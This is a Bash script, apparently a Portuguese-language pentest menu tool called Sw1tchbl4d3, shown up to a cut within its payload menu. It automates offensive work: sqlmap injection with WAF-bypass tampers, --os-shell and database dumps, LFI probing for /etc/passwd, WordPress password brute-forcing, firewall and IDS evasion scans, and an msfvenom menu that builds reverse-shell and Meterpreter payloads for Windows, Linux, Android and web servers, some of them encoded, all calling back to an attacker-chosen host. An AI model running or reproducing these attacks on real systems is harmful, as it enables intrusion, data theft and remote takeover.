#!/bin/bash
################################ Variaveis ##################################
#portaalvo=""
#ipalvo=""
###dirb="/work/dirsearch/dirsearch.py"
###share="//usr/share/dirb/wordlists/shares.txt"
opnmap1="-sS -sV -sC -A -Pn"
portas="-p-"
opgobuster1="php,txt,html,sh,cgi,js,css,py,bak,pdf,doc,docx,xml"
arquivosbrute="/usr/share/dirb/wordlists/big.txt"
wordlista="/work/rockyou.txt"
token2="token"
listadominios1="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
wordlistLFI2="/work/wordlist-lfi.txt"
listaAlha="/usr/share/crunch/charset.lst"
communities1="/work/community.txt"
diretorios="/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt"
arquivos2="/usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt"
parampp="/work/ParamSpider/paramspider.py"
xsstrike="/work/XSStrike/xsstrike.py"
commix="/work/commix/commix.py"
templetes="/root/nuclei-templates/"
############################ Cidade & Data ######################################
datahoje=$(date '+%d/%m/%Y - %T')
cidade="Belem-Para"
#################################################################################

dependencias()
{
if ! [[ -e $arquivosbrute ]];then echo "$arquivosbrute" nao existe;else echo "$arquivosbrute OK";fi
if ! [[ -e $wordlista ]];then echo "$wordlista" nao existe;else echo "$wordlista OK";fi
if ! [[ -e $token2 ]];then echo "$token2 necessario para usar wpscan";else echo "$token2 OK";fi
if ! [[ -e $listadominios1 ]];then echo "$listadominios1" nao existe;else echo "$listadominios1 OK";fi
if ! [[ -e $wordlistLFI2 ]];then echo "$wordlistLFI2" nao existe;else echo "$wordlistLFI2 OK";fi
if ! [[ -e $listaAlha ]];then echo "$listaAlha" nao existe;else echo "$listaAlha OK";fi
if ! [[ -e $communities1 ]];then echo "$communities1" nao existe;else echo "$communities1 OK";fi
if ! [[ -e $diretorios ]];then echo "$diretorios" nao existe;else echo "$diretorios OK";fi
if ! [[ -e $arquivos2 ]];then echo "$arquivos2" nao existe;else echo "$arquivos2 OK";fi
if ! [[ -e $parampp ]];then echo "$parampp" nao existe;else echo "$parampp OK";fi
if ! [[ -e $xsstrike ]];then echo "$xsstrike" nao existe;else echo "$xsstrike OK";fi
if ! [[ -e $commix ]];then echo "$commix" nao existe;else echo "$commix OK";fi
if ! [[ -e $templetes ]];then echo "$templetes" nao existe;else echo "$templetes OK";fi
if ! [[ -e /usr/bin/nmap ]];then echo "Faltando o programa nmap para funcionar";else echo "nmap OK";fi
if ! [[ -e /usr/bin/gobuster ]];then echo "Faltando pacote gobuster para funcionar";else echo "gobuster OK";fi
if ! [[ -e /usr/bin/wpscan ]];then echo "Faltando pacote wpscan para funcionar";else echo "wpscan OK";fi
if ! [[ -e /usr/bin/sqlmap ]];then echo "Faltando pacote sqlmap para funcionar";else echo "sqlmap OK";fi
if ! [[ -e /usr/bin/host ]];then echo "Faltando pacote host para funcionar";else echo "host OK";fi
if ! [[ -e /usr/bin/joomscan ]];then echo "Faltando pacote joomscan para funcionar";else echo "joomscan OK";fi
if ! [[ -e /usr/bin/wget2 ]];then echo "Faltando pacote wget2 para funcionar";else echo "wget2 OK";fi
if ! [[ -e /usr/bin/whatweb ]];then echo "Faltando pacote whatweb para funcionar";else echo "whatweb OK";fi
if ! [[ -e /usr/bin/wafw00f ]];then echo "Faltando pacote wafw00f para funcionar";else echo "wafw00f OK";fi
if ! [[ -e /usr/bin/sslscan ]];then echo "Faltando pacote sslscan para funcionar";else echo "sslscan OK";fi
if ! [[ -e /usr/bin/wget ]];then echo "Faltando pacote wget para funcionar";else echo "wget OK";fi
if ! [[ -e /usr/bin/sed ]];then echo "Faltando pacote sed para funcionar";else echo "sed OK";fi
if ! [[ -e /usr/bin/onesixtyone ]];then echo "Faltando pacote onesixtyone para funcionar";else echo "onesixtyone OK";fi
if ! [[ -e /usr/bin/enum4linux ]];then echo "Faltando pacote enum4linux para funcionar";else echo "enum4linux OK";fi
if ! [[ -e /usr/bin/curl ]];then echo "Faltando pacote curl para funcionar";else echo "curl OK";fi
if ! [[ -e /usr/bin/base64 ]];then echo "Faltando pacote base64 para funcionar";else echo "base64 OK";fi
if ! [[ -e /usr/bin/md5sum ]];then echo "Faltando pacote md5sum para funcionar";else echo "md5sum OK";fi
if ! [[ -e /usr/bin/sha256sum ]];then echo "Faltando pacote sha256sum para funcionar";else echo "sha256sum OK";fi
if ! [[ -e /usr/bin/sha512sum ]];then echo "Faltando pacote sha512sum para funcionar";else echo "sha512sum OK";fi
if ! [[ -e /usr/bin/perl ]];then echo "Faltando pacote perl para funcionar";else echo "perl OK";fi
if ! [[ -e /usr/bin/awk ]];then echo "Faltando pacote awk para funcionar";else echo "awk OK";fi
if ! [[ -e /usr/bin/ping ]];then echo "Faltando pacote ping para funcionar";else echo "ping OK";fi
if ! [[ -e /usr/bin/smbclient ]];then echo "Faltando pacote smbclient para funcionar";else echo "smbclient OK";fi
if ! [[ -e /usr/bin/nbtscan ]];then echo "Faltando pacote nbtscan para funcionar";else echo "nbtscan OK";fi
if ! [[ -e /usr/bin/msfvenom ]];then echo "Faltando pacote msfvenom para funcionar";else echo "msfvenom OK";fi
if ! [[ -e /usr/bin/dirsearch ]];then echo "Faltando pacote dirsearch para funcionar";else echo "dirsearch OK";fi
if ! [[ -e /usr/bin/davtest ]];then echo "Faltando pacote davtest para funcionar";else echo "davtest OK";fi
if ! [[ -e /usr/bin/cadaver ]];then echo "Faltando pacote cadaver para funcionar";else echo "cadaver OK";fi
if ! [[ -e /usr/bin/steghide ]];then echo "Faltando pacote steghide para funcionar";else echo "steghide OK";fi
if ! [[ -e /usr/bin/john ]];then echo "Faltando pacote john para funcionar";else echo "john OK";fi
if ! [[ -e /usr/bin/hydra ]];then echo "Faltando pacote hydra para funcionar";else echo "hydra OK";fi
if ! [[ -e /usr/bin/hashcat ]];then echo "Faltando pacote hashcat para funcionar";else echo "hashcat OK";fi
if ! [[ -e /usr/share/john/ssh2john.py ]];then echo "Faltando pacote /usr/share/john/ssh2john.py para funcionar";else echo "/usr/share/john/ssh2john.py OK";fi
if ! [[ -e /usr/bin/ssh ]];then echo "Faltando pacote ssh para funcionar";else echo "ssh OK";fi
if ! [[ -e /usr/bin/nc ]];then echo "Faltando pacote nc para funcionar";else echo "nc OK";fi
if ! [[ -e /usr/bin/lynx ]];then echo "Faltando pacote lynx para funcionar";else echo "lynx OK";fi
if ! [[ -e /usr/bin/crunch ]];then echo "Faltando pacote crunch para funcionar";else echo "crunch OK";fi
if ! [[ -e /usr/share/seclists/Passwords/ ]];then echo "Faltando /usr/share/seclists/Passwords/ para funcionar";else echo "/usr/share/seclists/Passwords/ OK";fi
if ! [[ -e /usr/share/wordlists/ ]];then echo "Faltando /usr/share/wordlists/ para funcionar";else echo "/usr/share/wordlists/ OK";fi
if ! [[ -e /usr/bin/pwgen ]];then echo "Faltando pacote pwgen para funcionar";else echo "pwgen OK";fi
if ! [[ -e /usr/bin/cewl ]];then echo "Faltando pacote cewl para funcionar";else echo "cewl OK";fi
if ! [[ -e /usr/bin/subfinder ]];then echo "Faltando pacote subfinder para funcionar";else echo "subfinder OK";fi
if ! [[ -e /usr/bin/httpx ]];then echo "Faltando pacote httpx para funcionar";else echo "httpx OK";fi
if ! [[ -e /usr/bin/fidomain ]];then echo "Faltando pacote findomain para funcionar";else echo "findomain OK";fi
if ! [[ -e /usr/bin/gauplus ]];then echo "Faltando pacote gauplus para funcionar";else echo "gauplus OK";fi
if ! [[ -e /usr/bin/nuclei ]];then echo "Faltando pacote nuclei para funcionar";else echo "nuclei OK";fi
if ! [[ -e /usr/bin/dalfox ]];then echo "Faltando pacote dalfox para funcionar";else echo "dalfox OK";fi
if ! [[ -e /usr/bin/searchsploit ]];then echo "Faltando pacote searchsploit para funcionar";else echo "searchsploit OK";fi
}

#################################################################################

banner()
{
    echo ""
    echo $cidade $datahoje
    echo '
    1 - Scan Servicos & Vuln Nmap        2 - Scan Arquivos Gobuster
    3 - Scan WordPress Wpscan            4 - Scan SQLMAP
    5 - Pesquisa DNS                     6 - Scan joomla joomscan
    7 - Clonando Dominio                 8 - Recon WhatWeb Tecnologias
    9 - Identificar WAF                  10 - Sslscan
    11- Brute Force de SubDomain         12- Baixar arquivos do ftp
    13- Transferencia de Zona            14- Onesixtyone
    15- Enum4linux                       16- Procurar Exploit publico
    17- Explorao LFI linux               18- Convertendo Bases
    19- PingSweep Scan                   20- Enumerando Arq. SMB netbios
    21- Criando Reverse Shell MSFvenom   22- Dirsearch
    23- PortScan                         24- Analisando Metodos HTTP
    25- Modulo WEBDAV inj. shell.php     26- Esteganografia
    27- Brute Force                      28- Infecao de Log SSH - LFI linux
    29- Google Hack                      30- Gerando Wordlista Personalizada
    31- RECON - ATACK - BugHunter        32- XSStrike
    33- ParamSpider                      34- commix POST
    35- command Injection Post           36- Criar foto com code Injection exiftool
  
    '
}

banner2()
{
echo "███████╗██╗    ██╗ ██╗ ██████╗██╗  ██╗██████╗ ██╗██╗  ██╗██████╗ ██████╗     ██╗   ██╗    ██████╗     ██████╗" 
echo "██╔════╝██║    ██║███║██╔════╝██║  ██║██╔══██╗██║██║  ██║██╔══██╗╚════██╗    ██║   ██║    ╚════██╗   ██╔═████╗"
echo "███████╗██║ █╗ ██║╚██║██║     ███████║██████╔╝██║███████║██║  ██║ █████╔╝    ██║   ██║     █████╔╝   ██║██╔██║"
echo "╚════██║██║███╗██║ ██║██║     ██╔══██║██╔══██╗██║╚════██║██║  ██║ ╚═══██╗    ╚██╗ ██╔╝     ╚═══██╗   ████╔╝██║"
echo "███████║╚███╔███╔╝ ██║╚██████╗██║  ██║██████╔╝███████╗██║██████╔╝██████╔╝     ╚████╔╝     ██████╔╝██╗╚██████╔╝"
echo "╚══════╝ ╚══╝╚══╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝╚═════╝ ╚═════╝       ╚═══╝      ╚═════╝ ╚═╝ ╚═════╝ "
                                                                                                         

}

banner3()
{
    echo "+-+-+-+-+-+-+-+-+-+-+-+ +-+ +-+-+-+"
    echo "|S|w|1|t|c|h|b|l|4|d|3| |v| |3|.|0|"
    echo "+-+-+-+-+-+-+-+-+-+-+-+ +-+ +-+-+-+"                                 
}

nmap1()
{
    echo "Modulo NMAP"
    echo	
	echo "1) Scan Discovery/Personalizado"
    echo "2) Enumerando NetBios Os-discovery"
    echo "3) Scan Scripts FTP"
    echo "4) Scan firewall/ids evasion"
	echo "5) Scan Scripts RDP"
    echo "6) Enumerando shares NetBios"
    echo "7) Scan Mysql Vuln"
	echo "8) Scan vulscan.nse"
                        	    
	read -e -p 'Opcao: ' resp
    echo
            
	case $resp in            

	1)  echo "Scan Discovery ou Personalizado" 	
	    echo "Digite o IP alvo:"
        read -e ip
	    echo "Digite as Opcoes do Scan ou Enter (Ex: -sS -sV -sC -A --script=vuln -p-)"
        read -e opnmap
        if [ "$opnmap" == "" ]
	    then
            nmap $opnmap1 $ip > ScanPadrao.txt
		    cat ScanPadrao.txt	
	    else
            nmap $opnmap $ip > ScanPerson.txt
            cat ScanPerson.txt
	    fi
        ;;

	    "2")# Scan NetBios - Enum - os-discovery 
            echo "Digite a Rede:"
		    read -e rede
            nmap -sS -p139,445 -Pn --open $rede -oG netbios.txt
            cat netbios.txt | grep "Up" | cut -d " " -f 2 > targetsNetBios.txt
            nmap --script smb-os-discovery -p 139,445 -iL targetsNetBios.txt
        ;;

	    "3")# Scan Scripts FTP
            echo "Digite o IP alvo"
            read -e rede  
            nmap -sS -p21,2121 -Pn --open $rede -oG FTP.txt
            cat FTP.txt | grep "Up" | cut -d " " -f 2 > targetsFTP.txt
            nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p21,2121 -iL targetsFTP.txt
        ;;

	    "4")# Scan firewall/ids evasion
            echo "Digite o IP alvo"
            read -e ip  
		    echo "Digite a porta de bypass ex: 53"
		    read -e portabypass
		    echo "Digite a quantidade de Iscas  ex: 25"
		    read -e iscas
		    echo "Digite as Portas ex: -p- todas ou -p80,110,8080"
            read -e portas
		    nmap -sS -sV -sC -D $iscas -g $portabypass -T 4 --script=vuln $portas -Pn --open $ip -oG bypassfirewall.txt
        ;;

	    "5")# Scan Scripts RDP
            echo "Digite a Rede alvo:"
            read -e rede
		    nmap -sS -p3389 -Pn --open $rede -oG RDP.txt
		    cat RDP.txt | grep "Up" | cut -d " " -f 2 > targetsrdp.txt
            nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 -iL targetsrdp.txt
            ;;

	    "6")# Scan NetBios - enum-shares 
            echo "Digite a IP ou a Rede Alvo:"
		    read -e rede
            nmap --script smb-enum-shares -p 139,445 $rede
            ;;

	    "7")# Scan Mysql Vuln 
            echo "Digite a IP ou a Rede Alvo:"
		    read -e rede
            nmap -sV -p 3306 --script mysql-vuln-cve2012-2122,mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $rede
            ;;	    
		"8")# Scan vulscan.nse 
            echo "Digite o dominio Ex: www.example.com"
		    read -e rede
            nmap -sV --script=vulscan/vulscan.nse $rede
		esac
	    
}

gobuster1()
{
    echo "Modulo Gobuster "
    echo 	
    echo "1) DNS subdomain bruteforcing"
    echo "2) Directory/file brutceforcing"
    read -e -p 'Opcao: ' resp0
    echo
            
	case $resp0 in

	1) #
	echo "Digite o dominio alvo:"
	read -e dominio
	echo "Digite o caminho da wordlist ou Enter"
    read -e wordlista6
    if [ "$wordlista6" == "" ]
	then
        gobuster dns -d $dominio -w $listadominios1 -q -i	
	else
       	gobuster dns -d $dominio -w $wordlista6 -q -i
	fi
	;;

	2) #
	echo "Digite o IP/Dominio/Pasta alvo Ex: dominio/pasta"
	read -e dominio
	echo "Digite o caminho da wordlist ou Enter (Ex: /usr/share/wordlists/dirb/big.txt"
	read -e wordlista6
    echo "Digite as Extencao ou Enter Ex: txt,php,jpg,pdf"
    read  -e opgobuster
    echo "Scaneando o Alvo..."
    if [ "$wordlista6" == "" ]
	then
        if [ "$opgobuster" == "" ]
	    then
           	gobuster dir -r -u $dominio -w $arquivosbrute -e -t 100 -x $opgobuster1 --no-error -b 403,404 -r -q
	    else
            gobuster dir -r -u $dominio -w $arquivosbrute -e -t 100 -x $opgobuster --no-error -b 403,404 -r -q
        fi
	else
       	gobuster dir -r -u $dominio -w $wordlista6 -e -t 100 -x $opgobuster --no-error -b 403,404 -r -q
	fi
    esac
}

wpscan1()
{
    echo "Modulo Wpscan" 
	echo
    echo "1) Scan Plugins Vulneraveis"
    echo "2) Scan Enumerando usuarios"
    echo "3) Scan disable-tls-checks"	
	echo "4) Brute force em Senhas de Usuarios"
	read -e -p 'Opcao: ' resp00
    echo
			
	case $resp00 in
	    
	1)#Scan Plugins Vulneraveis
    echo "Digite o Dominio alvo:"
    read -e ip
    wpscan --url $ip --api-token $token2 --enumerate vp --plugins-detection aggressive
	;;

	2)#Scan Enumerando usuarios
    echo "Digite o Dominio alvo:"
    read -e ip
    wpscan --no-banner  --url $ip --api-token $token2 -e ap,u
    ;;
        
	3)#Scan disable-tls-checks
    echo "Digite o Dominio alvo:"
    read -e ip
    wpscan --disable-tls-checks --url $ip
	;;

	4)# Brute force em Senhas de Usuarios
    echo "Digite o Dominio alvo:"
    read -e ip
	echo "Digite os usuarios ex: carlos,tuma,fabio"
    read -e usuarios
    echo "Digite a wordlist ou Enter"
	read -e wordlist
	if [ "$wordlist" == "" ]
	then
    	wpscan --no-banner --url $ip -U $usuarios -P $arquivosbrute            		  	
	else
        wpscan --no-banner --url $ip -U $usuarios -P $wordlist            		 
	fi                      
           
	esac
}

sqlmap1()
{
    echo "Modulo SQLMAP"
    echo
	echo "1) GET - Scan Databases SQLMAP"
	echo "2) GET - Scan Tabelas SQLMAP"
    echo "3) GET - Scan Colunas SQLMAP"	
	echo "4) GET - DUMP SQLMAP"
	echo "5) POST - SQLMAP Scan Databases"
	echo "6) POST - SQLMAP Scan Tabelas"
    echo "7) POST - SQLMAP Scan Colunas"	
	echo "8) POST - SQLMAP DUMP"
	echo "9) TAMPER BY PASS WAF"
    read -e -p 'Opcao: ' resp1
    echo
			
	case $resp1 in
	    
	1)# Scan Databases SQLMAP
    echo "Digite a URL alvo SQLI:"
	read -e url
    sqlmap -u $url --risk=3 --level=5 --random-agent --dbs
	;;

	2)# Scan Tabelas SQLMAP
	echo "Digite a URL alvo SQLI"
	read -e url
    echo "Digite o nome da database:"
    read -e database1
    sqlmap -u $url --risk=3 --level=5 --random-agent -D $database1 --tables
    ;;

	3)# Scan Colunas SQLMAP
    echo "Digite a URL alvo SQLI:"
    read -e url
    echo "Digite database:"
    read -e database1
    echo "Digite a tabela:"
    read -e tabela
    sqlmap -u $url --risk=3 --level=5 --random-agent -D $database1 -T $tabela --columns
    ;;

	4)# DUMP SQLMAP
    echo "Digite a URL alvo SQLI:"
    read -e url
	echo "Digite database:"
    read -e database1
    echo "Digite a tabela:"
    read -e tabela
    echo "Digite a coluna:"
    read -e coluna
    sqlmap -u $url --risk=3 --level=5 --random-agent -D $database1 -T $tabela -C $coluna --dump
    ;;
                         
    5)# POST SQLMAP
    echo "Digite o campo POST ex: http://site/login.php"
    read -e campo
    echo "Digite as opcoes do POST ex: user=user&login=aa"
    read -e opcoes
    sqlmap -u "$url" --data="$opcoes" --risk=3 --level=5 --random-agent --dbs        
    ;;

	6)# POST SQLMAP Scan Tabelas
	echo "Digite o campo POST ex: http://site/login.php"
	read -e url
    echo "Digite as opcoes do POST ex: user=user&login=aa"
    read -e opcoes
	echo "Digite a nome da database"
    read -e database1
    sqlmap -u "$url" --data="$opcoes" --risk=3 --level=5 --random-agent -D $database1 --tables
    ;;

	7)# POST SQLMAP Scan Colunas
    echo "Digite o campo POST ex: http://site/login.php"
    read -e url
    echo "Digite as opcoes do POST ex: user=user&login=aa"
    read -e opcoes
	echo "Digite a nome da database"
    read -e database1
    echo "Digite a tabela:"
    read -e tabela
    sqlmap -u "$url" --data="$opcoes" --risk=3 --level=5 --random-agent -D $database1 -T $tabela --columns
    ;;

	8)# POST SQLMAP DUMP
    echo "Digite o campo POST ex: http://site/login.php"
    read -e url
	echo "Digite as opcoes do POST ex: user=user&login=aa"
    read -e opcoes
    echo "Digite a nome da database"
    read -e database1
    echo "Digite a tabela:"
    read -e tabela
    echo "Digite a coluna:"
    read -e coluna
    sqlmap -u "$url" --data="$opcoes" --risk=3 --level=5 --random-agent -D $database1 -T $tabela -C $coluna --dump  
    ;;
                         
    9)# TAMPER BY PASS WAF
    echo "Digite o campo POST ex: http://site/login.php"
    read url
	sqlmap -u "$url" --risk=3 --level=5 --random-agent --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords --batch --os-shell --dbs 
	esac
}

dns1()
{
    echo "Modulo Pesquisa DNS"
    echo 	
    echo "1) Localizando IP do dominio IPV4"
	echo "2) Localizando Servidor Email"
    echo "3) Localizando Servidores DNS"	
	echo "4) HINFO"
	echo "5) Localizando IPV6 do dominio"
    echo "6) Localizando TXT info"

    read -n1 -p 'Opcao: ' resp2
    echo
			
	case $resp2 in
	    
	1)# Localizando IP do dominio IPV4
    echo "Digite o domino:"
    read -e dominio
	host -t A $dominio
    ;;

	2)# Localizando Servidor Email
    echo "Digite o dominio:"
    read -e dominio
	host -t mx $dominio
    ;;
			
	"3")# Localizando Servidores DNS
    echo "Digite o dominio:"
    read -e dominio
	host -t ns $dominio
    ;;
			
    "4")# HINFO
    echo "Digite o dominio:"
    read -e dominio
	host -t hinfo $dominio
    ;;
			
	"5")# Localizando IPV6 do dominio
    echo "Digite o dominio:"
    read -e dominio
	host -t aaaa $dominio
    ;;
			
	"6")# Localizando TXT info
    echo "Digite o dominio:"
    read -e dominio
	host -t txt $dominio
      
	esac
}

joomscan1()
{
    echo "Modulo Joomscan"
    echo	
    echo "Digite o Dominio alvo:"
    read -e ip
    joomscan -ec -r -u $ip
	
}

clondom()
{
	echo "Modulo de clonar dominio"
    echo	
    echo "Digite o dominio alvo:"
    read -e dominio
    wget2 -m $dominio
	
}
whateb1()
{
    echo "Modulo Recon WhatWeb"
    echo	
    echo "Digite o dominio alvo:"
    read -e dominio1
    whatweb $dominio1
}

waf1()
{ 
    echo "Modulo Identificar WAF wafw00f"
    echo 	
    echo "Digite o Domino"
    read -e dominio
    wafw00f $dominio
}    

sslscan1()
{	
    echo "Modulo Sslscan"
    echo	
    echo "Digite o dominio Alvo"
    read -e alvo
    sslscan $alvo
}

brutesubdom()
{
    echo "Modulo de Brute Force de SubDomain"
    echo 	
    echo "Digite o Dominio:"
    read -e dominio2
    for subdominios1 in $(cat $listadominios1);do host $subdominios1.$dominio2 | grep "has address";done   
}

ftp1()
{
    echo "Modulo FTP, baixar arquivos" 
    echo "Digite o IP do alvo"
    read -e ip
    echo "Digite o usuario"
    read -e user
    echo "Digite a senha"
    read -e senha
	wget2 -m --no-passive ftp://"$user":"$senha"@$ip
}

transzona()
{
    # Transferencia de Zona 
    echo "Digite o dominio"
    read -e dominio
    echo "_________________________________"
    for dns in $(host -t ns $dominio | cut -d " " -f 4 > dnsdominios.txt ; sed 's/.$//' dnsdominios.txt | cat); do host -l $dominio $dns;done
}

onesixtyone1()
{            
    # Onesixtyone 
    echo "Digite o IP alvo"
    read -e ip
    echo "Digite o Caminho da lista de communities ou Enter"
    read -e communities
    if [ "$communities" == "" ]
	then
        onesixtyone -c $communities1 $ip 	
	else
        onesixtyone -c $communities $ip 
    fi
}

enum4linux1()
{
    # enum4linux 
    echo "Digite o IP alvo:"
    read -e ip
    enum4linux -a $ip
    
}


lfil()
{
    # Explorao LFI linux 
    echo "Digite o local com LFI ex: domino/arquivo.php?="
    read -e local2
    echo "Deseja digitar o payload = "p" ou utilizar a lista = "l"? "
    read -e pay
    if [ "$pay" == "p" ];
	then
        echo "(ps. macth no etc/passwd) use apenas o payload terminando "/" Ex: ../../../../"
        read -e payload
        curl -q -s "$local2""$payload""etc/passwd" -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -b "security=low; security_level=0; PHPSESSID=jrco71oq20vp1d2k8h72qa64t2; security=low" | grep -q "root:x"&&echo -e "VULN: $payload" 
	else

        for i in $(cat /work/payloads-lfi-l.txt);do curl -q -s "$local2""$i" -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | grep -q "root:x"&&echo -e "VULN: $i";done
    #-b "security=low; security_level=0; PHPSESSID=jrco71oq20vp1d2k8h72qa64t2; security=low"
	fi
}


convbases()
{
    # Convertendo Base64| md5sum | sha256sum | sha512sun 
          
	echo "1) Convertendo Arquivo.txt em Base64"
	echo "2) Convertendo Texto em Md5"
    echo "3) Convertendo Texto em sha256"	
	echo "4) Convertendo Texto em sha512"
	echo "5) Decode de arquivo em base64"
    echo "6) Converter Hex para Caractere"
    echo "7) Converter Decimal"
    echo "8) Base64 Decode de texto"
    echo "9) Converter texto em base64"
            
    read -e -p 'Opcao: ' resp3
    echo
	case $resp3 in
	    
	1)# 
    echo "Digite o caminho do arquivo ex: /home/arq.txt"
    read -e arquivo
	cat $arquivo | base64 
    ;;

	2)# 
    echo "Digite o Texto"
    read -e texto
	echo -n "$texto" | md5sum
    ;;
	
	3)# 
    echo "Digite o Texto"
    read -e texto
	echo -n "$texto" | sha256sum
    ;;
    
	4)# 
    echo "Digite o Texto"
    read -e texto
	echo -n "$texto" | sha512sum
    ;;
	
    5)# 
    echo "Digite o Caminho do Arquivo para Decode"
    read -e arquivo
	base64 -d $arquivo
    ;;
	
    6)# 
    echo "Digite o caractera o Hex para conveter:"
    read -e Hex
	echo -e "\x"$Hex
    ;;

	7)# 
    echo "Digite o caractera o Decimal para conveter:"
    read -e Decimal
	printf "%x\n" $Decimal
	;;
	
    7)# 
    echo "Digite o texto codificado para decode:"
    read -e texto
	echo "$texto" | base64 -d
    ;;
	
    8)# 
    echo "Digite o texto para converter:"
    read -e texto
	echo "$texto" | base64
	;;
	
    9)# 
    echo "Digite o texto Ascii converter Decimal:"
    read -e texto
	echo $texto | perl -lne 'print join " ", map { ord $_ } split //' | awk '{print $1","$2","$3","$4","$5","$6","$7","$8","$9","$10","$11","$12","$13","$14","$15}'
	esac
}

pingsweep()
{
    # PingSweep Scan /24
    echo "Digite o IP da rede Ex: 192.168.1.0"
    read -e ipI
    echo $ipI > ipI.txt
    echo "Digite o intervalo Ex: 1 254"
    read -e intervalo
    testa=$(awk -F. '{print $1"."$2"."$3}' ipI.txt)
    for i in $(seq $intervalo);do ping -c1 -w1 $testa.$i;done | grep "64 bytes"
}

netbios1()
{
    # Enumerando Arquivos SMB netbios 
    echo "1) Enumerando compar. - null session - smbclient"
	echo "2) Brute de compartilhamentos - null session"
    echo "3) Scan NetBios - nbtscan"	
    
	read -e -p 'Opcao: ' resp3
    echo
	case $resp3 in
	    
	1)# Enumerando compartilhamentos Host - null session
    echo "Digite o IP alvo:"
    read ip
    smbclient -L //$ip/ -N  
    ;;

    2)# Scan NetBios 
    echo "Digite a Rede:"
    read -e rede
	nbtscan $rede
    esac
}

msfvenon1()
{
    # Criando Reverse Shell MSFvenom 
    echo "1) Meterpreter Reverse TCP Shell - Windows x86"
    echo "2) Reverse HTTPS Shell - Windows"
    echo "3) Encoded Meterpreter Reverse HTTPS Shell - Windows"
    echo "4) Meterpreter Reverse TCP Shell - Linux"
    echo "5) Bind TCP Shell - Linux"
    echo "6) Web Reverse Shell ASP"
    echo "7) Web Reverse Shell PHP"
    echo "8) Web Reverse Shell JSP"
    echo "9) Web Reverse Shell WAR"
    echo "10) Script Reverse Shell Python"
    echo "11) Script Reverse Shell Bash"
    echo "12) Script Reverse Shell Perl"
    echo "13) Reverse HTTP Apk"
    echo "14) Reverse HTTPs Apk"
    echo "15) Reverse TCP Apk"
    echo "16) Reverse TCP macOS x86"
	read -e -p 'Opcao: ' resp4
    echo
    case $resp4 in
	
    1)# Reverse Tcp x86
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    msfvenom  -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f exe > shellTCP.exe		 
	;;
	2)# Reverse Https
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$porta -f exe > shellHTTPS.exe
    ;;
    3)# Reverse Encoder
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
	msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$porta -e x86/shikata_ga_nai -i 20 -f exe > shell.exe
	;;
	4)# Reverse tcp x86 x64
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    echo "Digite a arquitetura x86 ou x64"
    read -e arquitetura
    msfvenom -p linux/$arquitetura/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f elf > reverseTCP.elf
    ;; 
    5)#bind x86 x64
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    echo "Digite a arquitetura x86 ou x64"
    read -e arquitetura
    msfvenom -p linux/$arquitetura/meterpreter/bind_tcp RHOST=$ip LPORT=$porta -f elf > bindTCP.elfv
    ;; 
    6)# Reverse Asp
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f asp > shell.asp
 	;; 
    7)# Reverse PHP
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    msfvenom -p php/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f raw -o shell.php
    ;; 
    8)# Reverse Jsp
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$porta -f raw > shell.jsp	    
    ;;  
    9) # Reverse War
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$porta -f war > shell.war
    ;; 
    10) # Reverse Python
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$porta -f raw > shell.py
    ;; 
    11) # Reverse Bash
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$porta -f raw > shell.sh
    ;; 
    12)# Reverse Perl
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    msfvenom -p cmd/unix/reverse_perl LHOST=$ip LPORT=$porta -f raw > shell.pl
    ;; 
    13)# Reverse HTTP Apk
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    msfvenom -p android/meterpreter/reverse_http LHOST=$ip LPORT=$porta R > shellHTTP.apk
    ;; 
